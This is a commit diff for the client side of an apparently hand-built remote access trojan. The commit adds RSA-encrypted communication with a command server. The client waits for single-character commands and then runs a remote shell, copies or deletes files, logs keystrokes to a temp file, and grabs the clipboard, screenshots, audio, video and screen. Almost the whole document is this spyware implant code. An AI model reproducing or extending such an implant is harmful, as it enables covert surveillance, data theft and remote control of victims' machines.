Implemented Secure Connection with encryption(RSA only for now)
TO DO:
Implement AES(for performance) in combination with RSA(for keys exchanging)
Adjust all the functionality to use new connection
Also improve functionality in terms of UI/UX and other

+++ client.py
@@ -3,76 +3,83 @@ import platform
 import socket
 import logging
 import time
+import tempfile
 from pynput.keyboard import Listener
 from modules.client_module import (gather_system_info, command_line_interface, 
                                 file_directory_discovery, remote_file_copy,
                                 file_deletion, process_discovery, input_capture,
                                 clipboard_data, screenshot_capture, audio_capture,
                                 video_capture, screen_capture)
+from modules.connection_module import SecureConnectionClient
 
-LOG_FILE = "keys.txt"
-SERVER_ADDRESS = ("127.0.0.1", 585)
+
+LOG_FILE = tempfile.gettempdir() + "\keys.txt"
+print(LOG_FILE)
+SERVER_IP = "127.0.0.1"
+SERVER_PORT = 585
 RETRY_INTERVAL = 5
 
 logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s: %(message)s")
 def onpress(key):
     logging.info(str(key))
 
+connection = None
+
 def connect_to_server():
-    while True:
-        try:
-            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server.connect(SERVER_ADDRESS)
-            operation_system = platform.system()
-            server.send(operation_system[0].encode())
-            return server, operation_system
-        except ConnectionError:
-            time.sleep(RETRY_INTERVAL)
+    global connection
+    try:
+        connection = SecureConnectionClient(server_ip=SERVER_IP, server_port=SERVER_PORT)
+        if connection:
+            operation_system = platform.system()[0]
+            connection.send_data(operation_system)
+            return True
+    except Exception as ex:
+        logging.error(f"Error connecting to the server: {ex}")
+
 
 def main():
     while True:
-        try:
-            server, operation_system = connect_to_server()
-            
+        if connect_to_server():
+            operation_system = platform.system()
             while True:
                 try:
-                    byte = server.recv(1).decode()
+                    byte = connection.receive_data().decode("utf-8")
                     if not byte:
                         print("Connection closed by the server.")
                         break
                     if byte == "1":
-                        gather_system_info(server, operation_system)
+                        gather_system_info(connection, operation_system)
                     elif byte == "2":
-                        command_line_interface(server)
+                        command_line_interface(connection)
                     elif byte == "3":
-                        file_directory_discovery(server, operation_system)
+                        file_directory_discovery(connection, operation_system)
                     elif byte == "4":
-                        remote_file_copy(server)
+                        remote_file_copy(connection)
                     elif byte == "5":
-                        file_deletion(server)
+                        file_deletion(connection)
                     elif byte == "6":
-                        process_discovery(server, operation_system)
+                        process_discovery(connection, operation_system)
                     elif byte == "7":
-                        input_capture(server)
+                        input_capture(connection)
                         os.remove("keys.txt")
                     elif byte == "8":
-                        clipboard_data(server)
+                        clipboard_data(connection)
                     elif byte == "9":
-                        screenshot_capture(server)
+                        screenshot_capture(connection)
                     elif byte == "A":
-                        audio_capture(server)
+                        audio_capture(connection)
                     elif byte == "B":
-                        video_capture(server)
+                        video_capture(connection)
                     elif byte == "C":
-                        screen_capture(server)
+                        screen_capture(connection)
                         print("bomba")
                     elif byte == "S":
                         break
                 except socket.error as e:
                     print(f"Error: {e}")
                     break
-        except Exception as e:
-            print(f"{e}")
+        else:
+            logging.info(f"Cannot connect to the server: waiting {RETRY_INTERVAL} seconds.")
             time.sleep(RETRY_INTERVAL)
 
 if __name__ == "__main__":
